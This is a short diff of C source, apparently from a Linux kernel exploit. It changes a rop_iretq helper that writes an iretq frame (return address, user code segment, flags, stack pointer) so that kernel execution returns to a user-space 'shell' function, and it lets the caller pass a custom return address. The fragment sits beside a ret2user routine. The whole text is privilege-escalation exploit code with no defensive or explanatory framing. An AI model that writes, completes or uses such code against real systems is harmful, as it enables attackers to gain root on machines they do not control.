@@ -47,8 +47,12 @@ void ret2user() {
       ".att_syntax;");
 }
 
-void rop_iretq(unsigned long *p) {
-  *p++ = (unsigned long)&shell;
+void rop_iretq(unsigned long *p, void *rip) {
+  if (!rip) {
+    rip = (void *)shell;
+  }
+
+  *p++ = (unsigned long)rip;
   *p++ = user_cs;
   *p++ = user_rflags;
   *p++ = user_sp;
